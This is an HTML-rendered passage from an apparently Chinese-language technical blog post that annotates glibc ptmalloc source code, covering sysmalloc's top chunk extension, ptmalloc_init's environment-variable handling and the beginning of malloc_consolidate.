MALLOC_ALIGN_MASK;</span><br><span class="line">                    <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">                         We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">                         They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">                         prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">                         is always true after initialization.</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line"></span><br><span class="line">                        correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                        aligned_brk += correction;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     If this isn&#x27;t adjacent to existing space, then we will not</span></span><br><span class="line"><span class="comment">                     be able to merge with old_top space, so must add to 2nd request.</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//top chunk的大小</span></span><br><span class="line">                    correction += old_size;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Extend the end address to hit a page boundary */</span></span><br><span class="line">                    end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);</span><br><span class="line">                    <span class="comment">//top chunk结束位置至新分配内存空间的大小</span></span><br><span class="line">                    correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">                    assert (correction &gt;= <span class="number">0</span>);</span><br><span class="line">                    snd_brk = (<span class="type">char</span> *) (MORECORE (correction));</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     If can&#x27;t allocate correction, try to at least find out current</span></span><br><span class="line"><span class="comment">                     brk.  It might be enough to proceed without failing.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                     Note that if second sbrk did NOT fail, we assume that space</span></span><br><span class="line"><span class="comment">                     is contiguous with first sbrk. This is a safe assumption unless</span></span><br><span class="line"><span class="comment">                     program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span></span><br><span class="line"><span class="comment">                     occurred between our first and second calls.</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">                    &#123;</span><br><span class="line">                        correction = <span class="number">0</span>;</span><br><span class="line">                        snd_brk = (<span class="type">char</span> *) (MORECORE (<span class="number">0</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">                        <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">                        <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                            (*hook)();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* handle non-contiguous cases */</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">                        <span class="comment">/* MORECORE/mmap must correctly align */</span></span><br><span class="line">                        assert (((<span class="type">unsigned</span> <span class="type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                        <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">                             We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">                             They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">                             prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">                             is always true after initialization.</span></span><br><span class="line"><span class="comment">                           */</span></span><br><span class="line"></span><br><span class="line">                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Find out current end of memory */</span></span><br><span class="line">                    <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">                    &#123;</span><br><span class="line">                        snd_brk = (<span class="type">char</span> *) (MORECORE (<span class="number">0</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//此时已经获得了对齐之后的内存空间的起始地址aligned_brk</span></span><br><span class="line">                <span class="comment">/* Adjust top based on results of second sbrk */</span></span><br><span class="line">                <span class="keyword">if</span> (snd_brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">                &#123;</span><br><span class="line">                    av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">                    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">                    av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     If not the first time through, we either have a</span></span><br><span class="line"><span class="comment">                     gap due to foreign sbrk or a non-contiguous region.  Insert a</span></span><br><span class="line"><span class="comment">                     double fencepost at old_top to prevent consolidation with space</span></span><br><span class="line"><span class="comment">                     we don&#x27;t own. These fenceposts are artificial chunks that are</span></span><br><span class="line"><span class="comment">                     marked as inuse and are in any case too small to use.  We need</span></span><br><span class="line"><span class="comment">                     two to make sizes and alignments work out.</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (old_size != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">                         multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">                         enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                        old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">                        set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">                         old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">                         intentional. We need the fencepost, even if old_top otherwise gets</span></span><br><span class="line"><span class="comment">                         lost.</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                        chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">                            (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                        chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                            (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">                        <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">                        &#123;</span><br><span class="line">                            _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>sbrk</code>扩展内存成功</p><ul><li><p>若扩展的内存是否与原始的<code>top chunk</code>相邻（通过判断<code>brk==old_end</code>）且不是通过<code>mmap</code>分配的，此时直接增加<code>top chunk</code>的<code>size</code>即可。</p></li><li><p>否则先判断<code>sbrk</code>的执行是否出错，如果未出错则表示新分配的内存地址大于原有的<code>top chunk</code>但是不连续。</p><ul><li><p>先判断<code>malloc_state</code>的连续标志位，如果标志位为连续，则表示不是通过<code>mmap</code>分配的（会设置不连续标志位），应该是进程内的其他线程调用<code>sbrk</code>分配了内存空间。那么这一段内存也算是进程分配的内存空间更新<code>malloc_state</code>中的<code>system_mem</code>值。然后将分配的<code>brk</code>指针按照<code>MALLOC_ALIGNMENT</code>对齐。由于地址不连续就需要放弃当前<code>top chunk</code>的内存区域，程序中将<code>top chunk</code>的大小和对齐消耗的内存大小之和存储在<code>correction</code>变量中，调用<code>sbrk</code>函数在内存中又分配这<code>correction</code>大小的空间，其起始地址存储在<code>snd_brk</code>中。若分配失败则将<code>snd_brk</code>存储为第一次<code>brk</code>结束的地址，并置空<code>correction</code>变量。</p><blockquote><p>这部分的操作主要是为了弥补<code>top chunk</code>的损失，因为之后<code>top chunk</code>就释放了。需要补偿的原因是因为在进入主分配操作的时候，曾经判断<code>malloc_state</code>的连续性，如果连续则减去了<code>top chunk</code>的大小之后采用<code>sbrk</code>分配相应大小的内存。所以在使用<code>sbrk</code>这种方法的时候需要补偿<code>top chunk</code>才能够分配到符合用户大小的空间。</p><p>而<code>sbrk</code>分配失败而采用<code>mmap</code>分配的时候则是加上了<code>top chunk</code>的大小，因此<code>mmap</code>不需要补偿。</p></blockquote></li><li><p>如果是采用<code>MMAP</code>分配的空间，则只需要对内存的起始地址进行对齐就可以了。</p></li></ul></li></ul><p>到这里我们获取得到了经过对齐之后的内存空间起始地址<code>aligned_brk</code>，更新<code>top chunk</code>指针。由于地址不连续因此需要在靠近不连续内存起始的地方设置<code>fenceposts</code>，以防止之前的<code>chunk</code>与这部分内存区域合并。每个<code>fenceposts</code>的大小为<code>2*size_sz</code>（共两个），将其<code>prev_inuse</code>始终置为<code>1</code>。然后释放<code>top chunk</code>中剩余的部分。到这里就基本上完成了内存扩展的部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="comment">//处理分配区为空或者可以使用mmap的情况</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">//处理当前的分配区为非主分配区的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//处理分配区为主分配区的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//经过上面的操作之后top chunk已经被扩展到可以分配用户输入大小的程度了</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) av-&gt;system_mem &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (av-&gt;max_system_mem))</span><br><span class="line">        av-&gt;max_system_mem = av-&gt;system_mem;</span><br><span class="line">    check_malloc_state (av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">    p = av-&gt;top;</span><br><span class="line">    size = chunksize (p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (p, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        check_malloced_chunk (av, p, nb);</span><br><span class="line">        <span class="keyword">return</span> chunk2mem (p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* catch all failure paths */</span></span><br><span class="line">    __set_errno (ENOMEM);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过<code>top chunk</code>扩展之后向用户分配内存。</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ol><li>检查当前的分配区为空或者可以进行<code>mmap</code>，则调用<code>mmap</code>分配内存，若分配成功则返回分配的内存指针。否则进入下一步。</li><li>若当前分配区是主分配区则进入下一步，若当前分配区不是主分配区，则调用<code>grow_heap</code>增加<code>top chunk</code>空间，如果失败则调用<code>new_heap</code>重新分配一块内存。并在当前的<code>top chunk</code>的高地址处设置两块<code>inuse</code>的<code>chunk</code>（<code>fencepost</code>）以防止内存块与之后的内存块进行合并。进入第<code>9</code>步</li><li>当前的分配区是主分配区。若<code>malloc_state</code>连续，则尝试使用<code>MORECODE(sbrk)</code>分配<code>size-top_chunk.size</code>大小的内存空间，若分配失败则进入下一步。分配成功之后执行<code>after_morecode_hook</code>，进入第<code>4</code>步。</li><li>尝试使用<code>mmap</code>分配<code>size</code>大小的空间，若分配成功则设置当前的<code>malloc_state</code>不连续，进入下一步。</li><li>判断新分配的内存空间与<code>top chunk</code>连续则直接改变<code>top chunk</code>的<code>size</code>，进入第<code>n</code>步，否则进入下一步。</li><li>新分配的内存空间与<code>top chunk</code>不连续，若<code>malloc_state</code>标志位连续，则表示采用<code>sbrk</code>分配的内存空间，需要尝试对<code>top chunk size</code>大小的内存空间进行补偿，获取分配的补偿内存空间的起始地址，失败后不在尝试。进入第<code>8</code>步。若标志位不连续，进入下一步。</li><li>此时表示分配空间采用<code>mmap</code>分配，且不连续，则直接获取分配空间的结束地址，进入下一步。</li><li>此时已经获取了新分配的内存空间的起始和结束地址，设置<code>top chunk</code>指针，并设置<code>fencepost</code>，进入下一步</li><li>此时<code>top chunk</code>已经扩展完成，根据用户传入的<code>size</code>分配内存空间。</li></ol><h2 id="malloc-hook-ini"><a href="#malloc-hook-ini" class="headerlink" title="malloc_hook_ini"></a>malloc_hook_ini</h2><p>在第一次调用<code>malloc</code>的时候，<code>malloc_hook</code>不为空指向<code>malloc_hook_ini</code>函数，完成初始化工作。<code>malloc_hook_ini</code>函数定义在<code>glibc</code>源代码的<code>malloc/hooks.c</code>文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span></span><br><span class="line">&#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数首先将<code>malloc_hook</code>的位置设置为空，然后调用了<code>ptmalloc_init</code>函数继续执行初始化，初始化完成之后重新调用<code>__libc_malloc</code>函数，也就是重新执行<code>malloc</code>。</p><h3 id="ptmalloc-init"><a href="#ptmalloc-init" class="headerlink" title="ptmalloc_init"></a>ptmalloc_init</h3><p>函数定义在<code>malloc/arena.c</code>文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">    <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    __malloc_initialized = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="comment">//这里是保证只有主分配区使用sbrk分配连续的内存空间</span></span><br><span class="line">    <span class="comment">//如果glibc不在默认的命名空间，或者是程序是静态编译并调用了dl_open函数加载ptmalloc_ini</span></span><br><span class="line">    <span class="comment">//这种情况下glibc不允许使用sbrk分配内存（修改了__morecore）</span></span><br><span class="line">    <span class="comment">/* In case this libc copy is in a non-default namespace, never use brk.</span></span><br><span class="line"><span class="comment">     Likewise if dlopened from statically linked program.  */</span></span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (ptmalloc_init, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">        __morecore = __failing_morecore;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    thread_arena = &amp;main_arena;</span><br><span class="line">    thread_atfork (ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数首先判断了<code>ptmalloc</code>是否已经被初始化<code>__malloc_initialized</code>变量的初始值为<code>-1</code>，若未初始化则设置初始化变量。</p><p><code>thread_atfork</code>函数用来设置<code>fork</code>时处理锁的函数，防止死锁。在<code>fork</code>之前父进程调用<code>ptmalloc_lock_all</code>将所有的分配区锁住，禁止分配内存，子线程创建完毕之后，父进程执行<code>ptmalloc_unlock_all</code>释放所有的锁，由于子进程拷贝了父进程的互斥锁的状态，因此子进程执行<code>ptmalloc_unlock_all2</code>重新初始化所有的锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">    <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//判断是否已经初始化</span></span><br><span class="line">    <span class="comment">//获取主分配区</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *s = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (_environ != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> **runp = _environ;</span><br><span class="line">      <span class="type">char</span> *envline;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (__builtin_expect ((envline = next_env_entry (&amp;runp)) != <span class="literal">NULL</span>,</span><br><span class="line">                               <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">//获取第一次出现=的位置</span></span><br><span class="line">          <span class="type">size_t</span> len = <span class="built_in">strcspn</span> (envline, <span class="string">&quot;=&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (envline[len] != <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="comment">/* This is a &quot;MALLOC_&quot; variable at the end of the string</span></span><br><span class="line"><span class="comment">               without a &#x27;=&#x27; character.  Ignore it since otherwise we</span></span><br><span class="line"><span class="comment">               will access invalid memory below.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (len)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;CHECK_&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>)</span><br><span class="line">                s = &amp;envline[<span class="number">7</span>];</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;TOP_PAD_&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_TOP_PAD, atoi (&amp;envline[<span class="number">9</span>]));</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;PERTURB_&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_PERTURB, atoi (&amp;envline[<span class="number">9</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;MMAP_MAX_&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_MMAP_MAX, atoi (&amp;envline[<span class="number">10</span>]));</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;ARENA_MAX&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_ARENA_MAX, atoi (&amp;envline[<span class="number">10</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;ARENA_TEST&quot;</span>, <span class="number">10</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_ARENA_TEST, atoi (&amp;envline[<span class="number">11</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">              <span class="keyword">if</span> (!__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;TRIM_THRESHOLD_&quot;</span>, <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_TRIM_THRESHOLD, atoi (&amp;envline[<span class="number">16</span>]));</span><br><span class="line">                  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">memcmp</span> (envline, <span class="string">&quot;MMAP_THRESHOLD_&quot;</span>, <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line">                    __libc_mallopt (M_MMAP_THRESHOLD, atoi (&amp;envline[<span class="number">16</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &amp;&amp; s[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        __libc_mallopt (M_CHECK_ACTION, (<span class="type">int</span>) (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">        <span class="keyword">if</span> (check_action != <span class="number">0</span>)</span><br><span class="line">            __malloc_check_init ();<span class="comment">//定义在malloc/hooks.c文件中。</span></span><br><span class="line">        <span class="comment">//将free,malloc,realloc,memalign函数的hook指向了各自的检查函数，用来检查是否已经初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__malloc_initialize_hook);</span><br><span class="line">    <span class="keyword">if</span> (hook != <span class="literal">NULL</span>)</span><br><span class="line">        (*hook)();</span><br><span class="line">    __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一部分是从环境变量中读取相应的配置参数的值，如果某些项存在则调用<code>__libc_mallopt</code>函数设置相应的值。在函数调用的结尾处查看是否存在<code>__malloc_initialize_hook</code>，如果存在则执行相应的<code>hook</code>函数，否则设置初始化变量为<code>1</code>表示已经完成了初始化。</p><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>该函数的主要作用是对堆进行初始化，以及将<code>fastbin</code>中的空闲<code>chunk</code>合并到<code>unsorted bin</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  malloc_init_state(av);</span><br><span class="line">  check_malloc_state(av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先函数调用<code>get_max_fast</code>函数，该函数可以判断堆是否进行了初始化。因为在未初始化的时候，其返回值<code>global_max_fast</code>为<code>0</code>。若未初始化则对堆进行初始化，主要是将<code>global_max_fast</code>设置为<code>DEFAULT_MXFAST</code>，设置<code>bins</code>链表，将其<code>fd,bk</code>指针均指向自身，初始化<code>top chunk</code>。</p><p>若已经进行了初始化，则首先执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 